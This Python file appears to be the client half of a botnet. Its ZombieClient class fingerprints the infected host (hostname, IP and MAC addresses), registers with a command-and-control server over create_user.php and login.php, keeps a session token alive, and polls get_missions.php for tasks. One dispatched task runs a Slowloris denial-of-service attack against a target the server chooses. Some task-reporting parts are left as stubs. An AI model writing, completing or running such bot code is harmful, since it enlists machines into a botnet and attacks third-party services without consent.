#!/usr/bin/env python
# -*- coding: utf-8 -*-
# r3nt0n

import socket, datetime

from time import sleep
from random import randint
from hashlib import sha256

from app.modules import config, logger, http_client
from app.modules.machine import Machine
from app.modules.attacks import Slowloris


class ZombieClient:
    def __init__(self):
        self.machine = Machine()

        self.jwt = None
        self.jwt_expiration_time = None

        self.new_tasks = []
        self.completed_tasks = []

    def refresh_public_net_info(self):
        self.machine.get_public_ip_cc()

    # read saved conf from config file
    def refresh_local_net_info(self):
        self.machine.get_hostname()
        self.machine.get_private_ip()
        self.machine.get_mac_addr()

    def generate_username(self):
        if not (self.machine.info['private_ip'] or self.machine.info['hostname']):
            self.refresh_local_net_info()
        string = (
                self.machine.info['private_ip'] + self.machine.info['hostname'] +
                (datetime.datetime.now() - datetime.timedelta(hours=randint(1,100))).strftime("%m/%d/%Y, %H:%M:%S")
        )
        username = sha256(bytes(string, 'utf-8')).hexdigest()
        return username

    def generate_password(self):
        charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!¡¿?=&@#-_.:;,'
        pswd_len = randint(24,32)
        password = ''
        for i in range(0, pswd_len):
            password += charset[randint(0, len(charset)-1)]
        return password

    def create_user(self):
        data = {
            'username': self.generate_username(),
            'pswd': self.generate_password()
        }
        url = config.credentials['cc_url'] + '/create_user.php'
        logger.log('trying to create user', 'WARNING')
        response = http_client.post_json(url, data)
        if response:
            logger.log('user created', 'SUCCESS')
            config.credentials['username'] = data['username']
            config.credentials['pswd'] = data['pswd']
            logger.log('writing new credentials to file', 'DEBUG')
            config.write_credentials()
            return True

    def login(self):
        login_url = config.credentials['cc_url'] + '/login.php'
        #config.load_settings('settings')
        data = {
            'username': config.credentials['username'],
            'pswd': config.credentials['pswd'],
            'hostname': self.machine.info['hostname']
        }

        logger.log('trying to login', 'WARNING')
        logger.log('url: {}'.format(login_url), 'INFO')
        logger.log('data: {}'.format(data), 'INFO')
        response = http_client.post_json(login_url, data)
        logger.log('response: {}'.format(response), 'DEBUG')
        if response and 'jwt' in response:
            self.jwt = response['jwt']
            self.jwt_expiration_time = datetime.datetime.now() + datetime.timedelta(hours=1)
            logger.log('jwt: {}'.format(self.jwt), 'SUCCESS')
            return self.jwt
        elif response and 'failed' in response['message']:
            if self.create_user():
                return True
        return False

    def keep_logged_in(self):
        while True:
            # logger.log('jwt: {}'.format(self.jwt), 'DEBUG')
            # logger.log('jwt_expiration_time: {}'.format(self.jwt_expiration_time), 'DEBUG')
            if (not self.jwt) or (self.jwt_expiration_time <= datetime.datetime.now()):
                self.refresh_local_net_info()
                try:
                    self.refresh_public_net_info()
                    self.login()
                # if no internet connection, sleep until retry login
                except socket.error:
                    logger.log('connection error, sleep for {} seconds'.format(config.read_setting('inet_unreach_retry')), 'ERROR')
                    sleep(config.read_setting('inet_unreach_retry'))
                    continue
            # sleep until recheck token
            sleep(config.read_setting('token_check_retry'))

    def get_new_tasks(self):
        while True:
            new_missions = http_client.post_json(config.credentials['cc_url'] + '/get_missions.php', data={'jwt': self.jwt})
            if new_missions:
                logger.log('new_homework:', 'SUCCESS')
                for mission in new_missions:
                    self.new_tasks.append(mission)
                    logger.log(mission, 'DEBUG')
            logger.log('any pending task', 'INFO')
            sleep(config.read_setting('refresh_tasks'))

    def post_completed_tasks(self):
        while True:
            for task in self.completed_tasks:
                logger.log('posting task exec result: {}'.format(task, 'SUCCESS'))
                # ...

    def keep_doing_tasks(self):
        while True:
            for task in self.new_tasks:
                logger.log('doing task: {}'. format(task, 'SUCCESS'))
                #self.do_task()
                # ...
                self.new_tasks.remove(task)

    def do_task(self, task_type, task_content):
        # inform cc => attack is begining
        # ...
        if ('atk-ddos-slowloris' in task_type):
            target = task_content
            slowloris = Slowloris(target)
            slowloris.run()

        # inform cc => attack is finished
        # ...

    def autosetup(self):
        if not config.load_credentials():
            while not self.create_user():
                sleep(config.read_setting('inet_unreach_retry'))
            logger.log('settings and credentials loaded', 'WARNING')
            config.write_credentials()

        if not config.load_settings():
            # default settings were loaded
            config.write_settings()
            logger.log('new settings writed', 'WARNING')
        logger.log('settings and credentials loaded', 'SUCCESS')
        return True

    def run(self):
        if self.autosetup():
            while not self.login():
                sleep(config.read_setting('inet_unreach_retry'))
            return True

